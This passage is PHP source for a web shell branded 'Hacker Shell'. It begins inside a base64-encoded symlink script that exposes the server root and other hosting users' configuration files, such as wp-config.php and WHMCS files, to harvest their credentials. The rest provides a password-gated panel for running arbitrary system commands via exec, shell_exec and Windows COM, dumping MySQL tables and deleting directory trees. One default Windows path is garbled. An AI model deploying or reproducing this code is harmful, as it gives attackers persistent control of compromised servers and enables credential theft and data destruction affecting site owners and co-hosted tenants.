L3BsYWluIC5waHAgXG4gQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgXG4gIEFkZFR5cGUgdGV4dC9wbGFpbiAuaHRtbCBcbiBBZGRIYW5kbGVyIHR4dCAuaHRtbCBcbiBSZXF1aXJlIE5vbmUgXG4gU2F0aXNmeSBBbnkiOwokZyA9IGZvcGVuKCdzeW0vLmh0YWNjZXNzJywndycpOwpmd3JpdGUoJGcsJHJyKTsKJFN5bSA9IHN5bWxpbmsoIi8iLCJzeW0vcm9vdCIpOwoJCSAgICAkcnQ9IjxhIGhyZWY9c3ltL3Jvb3Q+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+IFN5bTwvZm9udD48L2E+IjsKICAgICAgICBlY2hvICJSb290IC8gZm9sZGVyIHN5bWxpbmsgPGJyPjx1PiRydDwvdT4iOwoJCQoJCSRkaXI9bWtkaXIoJ3N5bScsMDc3Nyk7CgkJJHIgID0gIiBPcHRpb25zIGFsbCBcbiBEaXJlY3RvcnlJbmRleCBTdXguaHRtbCBcbiBBZGRUeXBlIHRleHQvcGxhaW4gLnBocCBcbiBBZGRIYW5kbGVyIHNlcnZlci1wYXJzZWQgLnBocCBcbiAgQWRkVHlwZSB0ZXh0L3BsYWluIC5odG1sIFxuIEFkZEhhbmRsZXIgdHh0IC5odG1sIFxuIFJlcXVpcmUgTm9uZSBcbiBTYXRpc2Z5IEFueSI7CiAgICAgICAgJGYgPSBmb3Blbignc3ltLy5odGFjY2VzcycsJ3cnKTsKICAgCiAgICAgICAgZndyaXRlKCRmLCRyKTsKICAgICAgICAkY29uc3ltPSI8YSBocmVmPXN5bS8+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+Y29uZmlndXJhdGlvbiBmaWxlczwvZm9udD48L2E+IjsKICAgICAgIAllY2hvICI8YnI+U3ltIExqbmsgQWxsIENvbkZpZyA8YnI+PHU+PGZvbnQgY29sb3I9cmVkIHNpemU9MiBmYWNlPVwiY29taWMgc2FucyBtc1wiPiRjb25zeW08L2ZvbnQ+PC91PiI7CiAgICAgICAJCiAgICAgICAJCSR1c3I9ZXhwbG9kZSgiXG4iLCRfUE9TVFsndXNlciddKTsKICAgICAgIAkkY29uZmlndXJhdGlvbj1hcnJheSgid3AtY29uZmlnLnBocCIsIndvcmRwcmVzcy93cC1jb25maWcucGhwIiwiY29uZmlndXJhdGlvbi5waHAiLCJibG9nL3dwLWNvbmZpZy5waHAiLCJqb29tbGEvY29uZmlndXJhdGlvbi5waHAiLCJ2Yi9pbmNsdWRlcy9jb25maWcucGhwIiwiaW5jbHVkZXMvY29uZmlnLnBocCIsImNvbmZfZ2xvYmFsLnBocCIsImluYy9jb25maWcucGhwIiwiY29uZmlnLnBocCIsIlNldHRpbmdzLnBocCIsInNpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwIiwid2htL2NvbmZpZ3VyYXRpb24ucGhwIiwid2htY3MvY29uZmlndXJhdGlvbi5waHAiLCJzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwIiwid2htYy9XSE0vY29uZmlndXJhdGlvbi5waHAiLCJ3aG0vV0hNQ1MvY29uZmlndXJhdGlvbi5waHAiLCJ3aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAiLCJzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwIiwiY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCIsImNsaWVudC9jb25maWd1cmF0aW9uLnBocCIsImNsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwIiwiY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCIsImNsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAiLCJiaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwIiwiYWRtaW4vY29uZmlnLnBocCIpOwoJCWZvcmVhY2goJHVzciBhcyAkdXNzICkKCQl7CgkJCSR1cz10cmltKCR1c3MpOwoJCQkJCQkKCQkJZm9yZWFjaCgkY29uZmlndXJhdGlvbiBhcyAkYykKCQkJewoJCQkgJHJzPSIvaG9tZS8iLiR1cy4iL3B1YmxpY19odG1sLyIuJGM7CgkJCSAkcj0ic3ltLyIuJHVzLiIgLi4gIi4kYzsKCQkJIHN5bWxpbmsoJHJzLCRyKTsKCQkJCgkJfQoJCQkKCQkJfQoJCQoJCQoJCX0KCQoJCgkKCT8+CjwvY2VudGVyPgk=
    ';
        $file       = fopen("symroot.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=symroot.php width=100% height=720px frameborder=0></iframe> ";
    }
    if ($action == 'shell') {
        if (IS_WIN && IS_COM) {
            if ($program && $parameter) {
                $shell = new COM('Shell.Application');
                $a     = $shell->ShellExecute($program, $parameter);
                m('Program run has ' . (!$a ? 'success' : 'fail'));
            }
            !$program && $program = 'c:\indows\ystem32\md.exe';
            !$parameter && $parameter = '/c net start > ' . SA_ROOT . 'log.txt';
            formhead(array(
                'title' => 'Execute Program'
            ));
            makehide('action', 'shell');
            makeinput(array(
                'title' => 'Program',
                'name' => 'program',
                'value' => $program,
                'newline' => 1
            ));
            p('<p>');
            makeinput(array(
                'title' => 'Parameter',
                'name' => 'parameter',
                'value' => $parameter
            ));
            makeinput(array(
                'name' => 'submit',
                'class' => 'bt',
                'type' => 'submit',
                'value' => 'Execute'
            ));
            p('</p>');
            formfoot();
        }
        formhead(array(
            'title' => 'Execute Command'
        ));
        makehide('action', 'shell');
        if (IS_WIN && IS_COM) {
            $execfuncdb = array(
                'phpfunc' => 'phpfunc',
                'wscript' => 'wscript',
                'proc_open' => 'proc_open'
            );
            makeselect(array(
                'title' => 'Use:',
                'name' => 'execfunc',
                'option' => $execfuncdb,
                'selected' => $execfunc,
                'newline' => 1
            ));
        }
        p('<p>');
        makeinput(array(
            'title' => 'Command',
            'name' => 'command',
            'value' => $command
        ));
        makeinput(array(
            'name' => 'submit',
            'class' => 'bt',
            'type' => 'submit',
            'value' => 'Execute'
        ));
        p('</p>');
        formfoot();
        if ($command) {
            p('<hr width="100%" noshade /><pre>');
            if ($execfunc == 'wscript' && IS_WIN && IS_COM) {
                $wsh       = new COM('WScript.shell');
                $exec      = $wsh->exec('cmd.exe /c ' . $command);
                $stdout    = $exec->StdOut();
                $stroutput = $stdout->ReadAll();
                echo $stroutput;
            } elseif ($execfunc == 'proc_open' && IS_WIN && IS_COM) {
                $descriptorspec = array(
                    0 => array(
                        'pipe',
                        'r'
                    ),
                    1 => array(
                        'pipe',
                        'w'
                    ),
                    2 => array(
                        'pipe',
                        'w'
                    )
                );
                $process        = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
                if (is_resource($process)) {
                    fwrite($pipes[0], $command . "
    ");
                    fwrite($pipes[0], "exit
    ");
                    fclose($pipes[0]);
                    while (!feof($pipes[1])) {
                        echo fgets($pipes[1], 1024);
                    }
                    fclose($pipes[1]);
                    while (!feof($pipes[2])) {
                        echo fgets($pipes[2], 1024);
                    }
                    fclose($pipes[2]);
                    proc_close($process);
                }
            } else {
                echo (execute($command));
            }
            p('</pre>');
        }
    }
    ?></td></tr></table>
    <div style="padding:10px;border-bottom:1px solid #0E0E0E;border-top:1px solid #0E0E0E;background:#0E0E0E;">
            <span style="float:right;"><?php
    debuginfo();
    ob_end_flush();
    ?></span>
            Copyright @ 2015 <a href=# target=_blank><B>.:: Hacker Shell ::. </B></a>
    </div>
    </body>
    </html>
    <?php
    function m($msg)
    {
        echo '<div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;">';
        echo $msg;
        echo '</div>';
    }
    function scookie($key, $value, $life = 0, $prefix = 1)
    {
        global $admin, $timestamp, $_SERVER;
        $key     = ($prefix ? $admin['cookiepre'] : '') . $key;
        $life    = $life ? $life : $admin['cookielife'];
        $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
        setcookie($key, $value, $timestamp + $life, $admin['cookiepath'], $admin['cookiedomain'], $useport);
    }
    function multi($num, $perpage, $curpage, $tablename)
    {
        $multipage = '';
        if ($num > $perpage) {
            $page   = 10;
            $offset = 5;
            $pages  = @ceil($num / $perpage);
            if ($page > $pages) {
                $from = 1;
                $to   = $pages;
            } else {
                $from = $curpage - $offset;
                $to   = $curpage + $page - $offset - 1;
                if ($from < 1) {
                    $to   = $curpage + 1 - $from;
                    $from = 1;
                    if (($to - $from) < $page && ($to - $from) < $pages) {
                        $to = $page;
                    }
                } elseif ($to > $pages) {
                    $from = $curpage - $pages + $to;
                    $to   = $pages;
                    if (($to - $from) < $page && ($to - $from) < $pages) {
                        $from = $pages - $page + 1;
                    }
                }
            }
            $multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\'' . $tablename . '\', \'\', 1);">First</a> ' : '') . ($curpage > 1 ? '<a href="javascript:settable(\'' . $tablename . '\', \'\', ' . ($curpage - 1) . ');">Prev</a> ' : '');
            for ($i = $from; $i <= $to; $i++) {
                $multipage .= $i == $curpage ? $i . ' ' : '<a href="javascript:settable(\'' . $tablename . '\', \'\', ' . $i . ');">[' . $i . ']</a> ';
            }
            $multipage .= ($curpage < $pages ? '<a href="javascript:settable(\'' . $tablename . '\', \'\', ' . ($curpage + 1) . ');">Next</a>' : '') . ($to < $pages ? ' <a href="javascript:settable(\'' . $tablename . '\', \'\', ' . $pages . ');">Last</a>' : '');
            $multipage = $multipage ? '<p>Pages: ' . $multipage . '</p>' : '';
        }
        return $multipage;
    }
    function loginpage()
    {
    ?><html>
    <head>
     
    <body bgcolor=black background=1.jpg>
     
                    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>.:: Hacker Shell ::. </title>
    <style type="text/css">
    A:link {text-decoration: none; color: green }
    A:visited {text-decoration: none;color:red}
    A:active {text-decoration: none}
    A:hover {text-decoration: underline; color: green;}
    input, textarea, button
    {
            font-size: 11pt;
            color:  #FFFFFF;
            font-family: verdana, sans-serif;
            background-color: #000000;
            border-left: 2px dashed #8B0000;
            border-top: 2px dashed #8B0000;
            border-right: 2px dashed #8B0000;
            border-bottom: 2px dashed #8B0000;
    }
     
    </style>
     
         
           <BR><BR>
    <div align=center >
    <fieldset style="border: 1px solid rgb(69, 69, 69); padding: 4px;width:450px;bgcolor:white;align:center;font-family:tahoma;font-size:10pt"><legend><font color=red><B>Giris     </b></font></legend>
     
    <div>
    <font color=#99CC33>
    <font color=#33ff00>==[ <B>Hacker Shell</B> ]== </font><BR><BR>
     
    <form method="POST" action="">
            <span style="font:10pt tahoma;">Sifre: </span><input name="password" type="password" size="20">
            <input type="hidden" name="doing" value="login">
            <input type="submit" value="Giris">
            </form>
    <BR>
    <B><font color=#FFFFFF>
    </div>
            </fieldset>
    </head>
    </html>
    <?php
        exit;
    }
    function execute($cfe)
    {
        $res = '';
        if ($cfe) {
            if (function_exists('exec')) {
                @exec($cfe, $res);
                $res = join("
    ", $res);
            } elseif (function_exists('shell_exec')) {
                $res = @shell_exec($cfe);
            } elseif (function_exists('system')) {
                @ob_start();
                @system($cfe);
                $res = @ob_get_contents();
                @ob_end_clean();
            } elseif (function_exists('passthru')) {
                @ob_start();
                @passthru($cfe);
                $res = @ob_get_contents();
                @ob_end_clean();
            } elseif (@is_resource($f = @popen($cfe, "r"))) {
                $res = '';
                while (!@feof($f)) {
                    $res .= @fread($f, 1024);
                }
                @pclose($f);
            }
        }
        return $res;
    }
    function which($pr)
    {
        $path = execute("which $pr");
        return ($path ? $path : $pr);
    }
    function cf($fname, $text)
    {
        if ($fp = @fopen($fname, 'w')) {
            @fputs($fp, @base64_decode($text));
            @fclose($fp);
        }
    }
    function debuginfo()
    {
        global $starttime;
        $mtime     = explode(' ', microtime());
        $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
        echo 'Processed in ' . $totaltime . ' second(s)';
    }
    function dbconn($dbhost, $dbuser, $dbpass, $dbname = '', $charset = '', $dbport = '3306')
    {
        if (!$link = @mysql_connect($dbhost . ':' . $dbport, $dbuser, $dbpass)) {
            p('<h2>Can not connect to MySQL server</h2>');
            exit;
        }
        if ($link && $dbname) {
            if (!@mysql_select_db($dbname, $link)) {
                p('<h2>Database selected has error</h2>');
                exit;
            }
        }
        if ($link && mysql_get_server_info() > '4.1') {
            if (in_array(strtolower($charset), array(
                'gbk',
                'big5',
                'utf8'
            ))) {
                q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
            }
        }
        return $link;
    }
    function s_array(&$array)
    {
        if (is_array($array)) {
            foreach ($array as $k => $v) {
                $array[$k] = s_array($v);
            }
        } else if (is_string($array)) {
            $array = stripslashes($array);
        }
        return $array;
    }
    function html_clean($content)
    {
        $content = htmlspecialchars($content);
        $content = str_replace("\n", "<br />", $content);
        $content = str_replace("  ", "&nbsp;&nbsp;", $content);
        $content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
        return $content;
    }
    function getChmod($filepath)
    {
        return substr(base_convert(@fileperms($filepath), 10, 8), -4);
    }
    function getPerms($filepath)
    {
        $mode = @fileperms($filepath);
        if (($mode & 0xC000) === 0xC000) {
            $type = 's';
        } elseif (($mode & 0x4000) === 0x4000) {
            $type = 'd';
        } elseif (($mode & 0xA000) === 0xA000) {
            $type = 'l';
        } elseif (($mode & 0x8000) === 0x8000) {
            $type = '-';
        } elseif (($mode & 0x6000) === 0x6000) {
            $type = 'b';
        } elseif (($mode & 0x2000) === 0x2000) {
            $type = 'c';
        } elseif (($mode & 0x1000) === 0x1000) {
            $type = 'p';
        } else {
            $type = '?';
        }
        $owner['read']    = ($mode & 00400) ? 'r' : '-';
        $owner['write']   = ($mode & 00200) ? 'w' : '-';
        $owner['execute'] = ($mode & 00100) ? 'x' : '-';
        $group['read']    = ($mode & 00040) ? 'r' : '-';
        $group['write']   = ($mode & 00020) ? 'w' : '-';
        $group['execute'] = ($mode & 00010) ? 'x' : '-';
        $world['read']    = ($mode & 00004) ? 'r' : '-';
        $world['write']   = ($mode & 00002) ? 'w' : '-';
        $world['execute'] = ($mode & 00001) ? 'x' : '-';
        if ($mode & 0x800) {
            $owner['execute'] = ($owner['execute'] == 'x') ? 's' : 'S';
        }
        if ($mode & 0x400) {
            $group['execute'] = ($group['execute'] == 'x') ? 's' : 'S';
        }
        if ($mode & 0x200) {
            $world['execute'] = ($world['execute'] == 'x') ? 't' : 'T';
        }
        return $type . $owner['read'] . $owner['write'] . $owner['execute'] . $group['read'] . $group['write'] . $group['execute'] . $world['read'] . $world['write'] . $world['execute'];
    }
    function getUser($filepath)
    {
        if (function_exists('posix_getpwuid')) {
            $array = @posix_getpwuid(@fileowner($filepath));
            if ($array && is_array($array)) {
                return ' / <a href="#" title="User: ' . $array['name'] . '&#13&#10Passwd: ' . $array['passwd'] . '&#13&#10Uid: ' . $array['uid'] . '&#13&#10gid: ' . $array['gid'] . '&#13&#10Gecos: ' . $array['gecos'] . '&#13&#10Dir: ' . $array['dir'] . '&#13&#10Shell: ' . $array['shell'] . '">' . $array['name'] . '</a>';
            }
        }
        return '';
    }
    function deltree($deldir)
    {
        $mydir = @dir($deldir);
        while ($file = $mydir->read()) {
            if ((is_dir($deldir . '/' . $file)) && ($file != '.') && ($file != '..')) {
                @chmod($deldir . '/' . $file, 0777);
                deltree($deldir . '/' . $file);
            }
            if (is_file($deldir . '/' . $file)) {
                @chmod($deldir . '/' . $file, 0777);
                @unlink($deldir . '/' . $file);
            }
        }
        $mydir->close();
        @chmod($deldir, 0777);
        return @rmdir($deldir) ? 1 : 0;
    }
    function bg()
    {
        global $bgc;
        return ($bgc++ % 2 == 0) ? 'alt1' : 'alt2';
    }
    function getPath($scriptpath, $nowpath)
    {
        if ($nowpath == '.') {
            $nowpath = $scriptpath;
        }
        $nowpath = str_replace('\\', '/', $nowpath);
        $nowpath = str_replace('//', '/', $nowpath);
        if (substr($nowpath, -1) != '/') {
            $nowpath = $nowpath . '/';
        }
        return $nowpath;
    }
    function getUpPath($nowpath)
    {
        $pathdb = explode('/', $nowpath);
        $num    = count($pathdb);
        if ($num > 2) {
            unset($pathdb[$num - 1], $pathdb[$num - 2]);
        }
        $uppath = implode('/', $pathdb) . '/';
        $uppath = str_replace('//', '/', $uppath);
        return $uppath;
    }
    function getcfg($varname)
    {
        $result = get_cfg_var($varname);
        if ($result == 0) {
            return 'No';
        } elseif ($result == 1) {
            return 'Yes';
        } else {
            return $result;
        }
    }
    function getfun($funName)
    {
        return (false !== function_exists($funName)) ? 'Yes' : 'No';
    }
    function GetList($dir)
    {
        global $dirdata, $j, $nowpath;
        !$j && $j = 1;
        if ($dh = opendir($dir)) {
            while ($file = readdir($dh)) {
                $f = str_replace('//', '/', $dir . '/' . $file);
                if ($file != '.' && $file != '..' && is_dir($f)) {
                    if (is_writable($f)) {
                        $dirdata[$j]['filename']    = str_replace($nowpath, '', $f);
                        $dirdata[$j]['mtime']       = @date('Y-m-d H:i:s', filemtime($f));
                        $dirdata[$j]['dirchmod']    = getChmod($f);
                        $dirdata[$j]['dirperm']     = getPerms($f);
                        $dirdata[$j]['dirlink']     = ue($dir);
                        $dirdata[$j]['server_link'] = $f;
                        $dirdata[$j]['client_link'] = ue($f);
                        $j++;
                    }
                    GetList($f);
                }
            }
            closedir($dh);
            clearstatcache();
            return $dirdata;
        } else {
            return array();
        }
    }
    function qy($sql)
    {
        $res = $error = '';
        if (!$res = @mysql_query($sql)) {
            return 0;
        } else if (is_resource($res)) {
            return 1;
        } else {
            return 2;
        }
        return 0;
    }
    function q($sql)
    {
        return @mysql_query($sql);
    }
    function fr($qy)
    {
        mysql_free_result($qy);
    }
    function sizecount($size)
    {
        if ($size > 1073741824) {
            $size = round($size / 1073741824 * 100) / 100 . ' G';
        } elseif ($size > 1048576) {
            $size = round($size / 1048576 * 100) / 100 . ' M';
        } elseif ($size > 1024) {
            $size = round($size / 1024 * 100) / 100 . ' K';
        } else {
            $size = $size . ' B';
        }
        return $size;
    }
    class PHPZip
    {
        var $out = '';
        function PHPZip($dir)
        {
            if (@function_exists('gzcompress')) {
                $curdir = getcwd();
                if (is_array($dir))
                    $filelist = $dir;
                else {
                    $filelist = $this->GetFileList($dir);
                    foreach ($filelist as $k => $v)
                        $filelist[] = substr($v, strlen($dir) + 1);
                }
                if ((!empty($dir)) && (!is_array($dir)) && (file_exists($dir)))
                    chdir($dir);
                else
                    chdir($curdir);
                if (count($filelist) > 0) {
                    foreach ($filelist as $filename) {
                        if (is_file($filename)) {
                            $fd      = fopen($filename, 'r');
                            $content = @fread($fd, filesize($filename));
                            fclose($fd);
                            if (is_array($dir))
                                $filename = basename($filename);
                            $this->addFile($content, $filename);
                        }
                    }
                    $this->out = $this->file();
                    chdir($curdir);
                }
                return 1;
            } else
                return 0;
        }
        function GetFileList($dir)
        {
            static $a;
            if (is_dir($dir)) {
                if ($dh = opendir($dir)) {
                    while ($file = readdir($dh)) {
                        if ($file != '.' && $file != '..') {
                            $f = $dir . '/' . $file;
                            if (is_dir($f))
                                $this->GetFileList($f);
                            $a[] = $f;
                        }
                    }
                    closedir($dh);
                }
            }
            return $a;
        }
        var $datasec = array();
        var $ctrl_dir = array();
        var $eof_ctrl_dir = "\50\4b\05\06\00\00\00\00";
        var $old_offset = 0;
        function unix2DosTime($unixtime = 0)
        {
            $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
            if ($timearray['year'] < 1980) {
                $timearray['year']    = 1980;
                $timearray['mon']     = 1;
                $timearray['mday']    = 1;
                $timearray['hours']   = 0;
                $timearray['minutes'] = 0;
                $timearray['seconds'] = 0;
            }
            return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
        }
        function addFile($data, $name, $time = 0)
        {
            $name     = str_replace('\\', '/', $name);
            $dtime    = dechex($this->unix2DosTime($time));
            $hexdtime = '\x' . $dtime[6] . $dtime[7] . '\x' . $dtime[4] . $dtime[5] . '\x' . $dtime[2] . $dtime[3] . '\x' . $dtime[0] . $dtime[1];
            eval('$hexdtime = "' . $hexdtime . '";');
            $fr = "\x50\x4b\x03\x04";
            $fr .= "\x14\x00";
            $fr .= "\x00\x00";
            $fr .= "\x08\x00";
            $fr .= $hexdtime;
            $unc_len = strlen($data);
            $crc     = crc32($data);
            $zdata   = gzcompress($data);
            $c_len   = strlen($zdata);
            $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
            $fr .= pack('V', $crc);
            $fr .= pack('V', $c_len);
            $fr .= pack('V', $unc_len);
            $fr .= pack('v', strlen($name));
            $fr .= pack('v', 0);
            $fr .= $name;
            $fr .= $zdata;
            $fr .= pack('V', $crc);
            $fr .= pack('V', $c_len);
            $fr .= pack('V', $unc_len);
            $this->datasec[] = $fr;
            $new_offset      = strlen(implode('', $this->datasec));
            $cdrec           = "\x50\x4b\x01\x02";
            $cdrec .= "\x00\x00";
            $cdrec .= "\x14\x00";
            $cdrec .= "\x00\x00";
            $cdrec .= "\x08\x00";
            $cdrec .= $hexdtime;
            $cdrec .= pack('V', $crc);
            $cdrec .= pack('V', $c_len);
            $cdrec .= pack('V', $unc_len);
            $cdrec .= pack('v', strlen($name));
            $cdrec .= pack('v', 0);
            $cdrec .= pack('v', 0);
            $cdrec .= pack('v', 0);
            $cdrec .= pack('v', 0);
            $cdrec .= pack('V', 32);
            $cdrec .= pack('V', $this->old_offset);
            $this->old_offset = $new_offset;
            $cdrec .= $name;
            $this->ctrl_dir[] = $cdrec;
        }
        function file()
        {
            $data    = implode('', $this->datasec);
            $ctrldir = implode('', $this->ctrl_dir);
            return $data . $ctrldir . $this->eof_ctrl_dir . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\00\00";
        }
    }
    function sqldumptable($table, $fp = 0)
    {
        $tabledump = "DROP TABLE IF EXISTS $table;
    ";
        $tabledump .= "CREATE TABLE $table (
    ";
        $firstfield = 1;
        $fields     = q("SHOW FIELDS FROM $table");
        while ($field = mysql_fetch_array($fields)) {
            if (!$firstfield) {
                $tabledump .= ",
    ";
            } else {
                $firstfield = 0;
            }
            $tabledump .= "   $field[Field] $field[Type]";
            if (!empty($field["Default"])) {
                $tabledump .= " DEFAULT '$field[Default]'";
            }
            if ($field['Null'] != "YES") {
                $tabledump .= " NOT NULL";
            }
            if ($field['Extra'] != "") {
                $tabledump .= " $field[Extra]";
            }
        }
        fr($fields);
        $keys = q("SHOW KEYS FROM $table");
        while ($key = mysql_fetch_array($keys)) {
            $kname = $key['Key_name'];
            if ($kname != "PRIMARY" && $key['Non_unique'] == 0) {
                $kname = "UNIQUE|$kname";
            }
            if (!is_array($index[$kname])) {
                $index[$kname] = array();
            }
            $index[$kname][] = $key['Column_name'];
        }
        fr($keys);
        while (list($kname, $columns) = @each($index)) {
            $tabledump .= ",
    ";
            $colnames = implode($columns, ",");
            if ($kname == "PRIMARY") {
                $tabledump .= "   PRIMARY KEY ($colnames)";
            } else {
                if (substr($kname, 0, 6) == "UNIQUE") {
                    $kname = substr($kname, 7);
                }
                $tabledump .= "   KEY $kname ($colnames)";
            }
        }
        $tabledump .= "
    );
     
    ";
        if ($fp) {
            fwrite($fp, $tabledump);
        } else {
            echo $tabledump;
        }
        $rows      = q("SELECT * FROM $table");
        $numfields = mysql_num_fields($rows);
        while ($row = mysql_fetch_array($rows)) {
            $tabledump    = "INSERT INTO $table VALUES(";
            $fieldcounter = -1;
            $firstfield   = 1;
            while (++$fieldcounter < $numfields) {
                if (!$firstfield) {
                    $tabledump .= ", ";
                } else {
                    $firstfield = 0;
                }
                if (!isset($row[$fieldcounter])) {
                    $tabledump .= "NULL";
                } else {
                    $tabledump .= "'" . mysql_escape_string($row[$fieldcounter]) . "'";
                }
            }
            $tabledump .= ");
    ";
            if ($fp) {
                fwrite($fp, $tabledump);
            } else {
                echo $tabledump;
            }
        }
        fr($rows);
        if ($fp) {
            fwrite($fp, "
    ");
        } else {
            echo "
    ";
        }
    }
    function ue($str)
    {
        return urlencode($str);
    }
    function p($str)
    {
        echo $str . "
    ";
    }
    function tbhead()
    {
        p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
    }
    function tbfoot()
    {
        p('</table>');
    }
    function makehide($name, $value = '')
    {
      p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
    }
    function makeinput($arg = array())
    {
        $arg['size']  = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
        $arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
        !$arg['type'] && $arg['type'] = 'text';
        $arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
        $arg['class'] = $arg['class'] ? $arg['class'] : 'input';
        if ($arg['newline']) {
            p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
        } else {
            p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
        }
    }
    function makeselect($arg = array())
    {
        if ($arg['onchange']) {
            $onchange = 'onchange="' . $arg['onchange'] . '"';
        }
        $arg['title'] = $arg['title'] ? $arg['title'] : '';
        if ($arg['newline'])
            p('<p>');
        p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
        if (is_array($arg['option'])) {
            foreach ($arg['option'] as $key => $value) {
                if ($arg['selected'] == $key) {
                    p("<option value=\"$key\" selected>$value</option>");
                } else {
                    p("<option value=\"$key\">$value</option>");
                }
            }
        }
        p("</select>");
        if ($arg['newline'])
            p('</p>');
    }
    function formhead($arg = array())
    {
        !$arg['method'] && $arg['method'] = 'post';
        !$arg['action'] && $arg['action'] = $self;
        $arg['target'] = $arg['target'] ? "target=\$arg[target]\"" : '';
        !$arg['name'] && $arg['name'] = 'form1';
        p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
        if ($arg['title']) {
            p('<h2>' . $arg['title'] . ' &raquo;</h2>');
        }
    }
    function maketext($arg = array())
    {
        !$arg['cols'] && $arg['cols'] = 100;
        !$arg['rows'] && $arg['rows'] = 25;
        $arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
        p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
    }
    function formfooter($name = '')
    {
        !$name && $name = 'submit';
        p('<p><input class="bt" name="' . $name . '" id=\"' . $name . '\" type="submit" value="Submit"></p>');
        p('</form>');
    }
    function formfoot()
    {
        p('</form>');
    }
    function pr($a)
    {
        echo '<pre>';
        print_r($a);
        echo '</pre>';
    }
?>
